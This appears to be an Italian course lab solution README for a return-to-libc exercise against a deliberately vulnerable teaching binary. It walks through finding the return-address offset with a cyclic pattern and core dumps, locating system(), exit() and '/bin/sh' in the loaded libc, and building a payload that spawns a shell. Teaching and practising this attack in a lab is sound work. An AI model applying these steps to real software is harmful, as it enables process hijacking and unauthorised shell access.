# 03 — Return-to-libc (`ret2libc`)

Sorgente: `src/03-ret2libc/ret2libc.c` — binario compilato in
`~student/bin/ret2libc`. `vulnerable()` legge l'input da **stdin** in un
buffer di 64 byte con `read(0, buffer, 300)`, senza controllo di lunghezza
(slide SS_3.1).

## Procedura (manuale, per la lezione)

1. **Offset fino all'indirizzo di ritorno**: si manda un pattern
   riconoscibile (`pwntools cyclic(200)`), si lascia crashare il programma
   e si legge `EIP` al momento del crash, poi si usa `cyclic_find()` per
   convertirlo nell'offset esatto — niente numero fisso "hardcoded": la
   dimensione del frame dipende dal compilatore/allineamento.

   In questo container il debug **live** con gdb (`break`/`run`/`step`)
   non funziona (limite di `ptrace` sotto QEMU — vedi la nota in cima a
   `solutions/README.md`): si analizza invece **il core dump generato
   automaticamente da QEMU al crash**, che gdb può aprire senza bisogno
   di ptrace:

   ```sh
   python3 -c "
   import resource, subprocess
   resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
   from pwn import cyclic
   p = subprocess.Popen(['/home/student/bin/ret2libc'], stdin=subprocess.PIPE)
   p.stdin.write(cyclic(200)); p.stdin.close(); p.wait()
   "
   ls qemu_ret2libc_*.core   # creato nella cwd da QEMU al SIGSEGV
   gdb -q -batch -ex 'print $eip' /home/student/bin/ret2libc qemu_ret2libc_*.core
   python3 -c "from pwn import cyclic_find; print(cyclic_find(<valore di eip>))"
   ```

2. **Indirizzo di `system()` e della stringa `"/bin/sh"` in libc**: anche
   `run-noaslr` (basato su `setarch`/`personality`) non funziona sotto
   questa emulazione. Non serve comunque: si legge la mappatura di libc
   di un processo **in esecuzione** da `/proc/<pid>/maps` (una semplice
   lettura, non richiede ptrace), e l'offset di `system()`/`"/bin/sh"`
   dentro il file di libc con `objdump`/`strings` — esattamente il
   procedimento automatizzato da `exploit.py`:

   ```sh
   sleep 5 | /home/student/bin/ret2libc &     # sleep tiene aperto lo stdin
   PID=$!
   grep 'libc\.so' /proc/$PID/maps | head -1        # base di libc caricata
   objdump -T /usr/lib32/libc.so.6 | grep ' system$' # offset di system() nel file
   # indirizzo runtime di system() = base + offset
   wait $PID 2>/dev/null
   ```

3. **Payload**: `padding(offset) + system() + exit() + "/bin/sh"` — dopo il
   `ret` corrotto, la funzione `vulnerable` "ritorna" dentro `system()` con
   `"/bin/sh"` come argomento; l'indirizzo dopo `system()` è l'indirizzo di
   ritorno di `system()` stesso (qui `exit()`, per uscire pulito invece di
   proseguire nel codice corrotto).

## Script (`exploit.py`)

```sh
python3 exploit.py
```

Determina l'offset con `cyclic`/corefile, ricava gli indirizzi di
`system`/`exit`/`"/bin/sh"` dalla libc effettivamente caricata a runtime
(`pwntools` legge `/proc/<pid>/maps` del processo), costruisce il payload e
apre una shell interattiva sul processo exploitato.
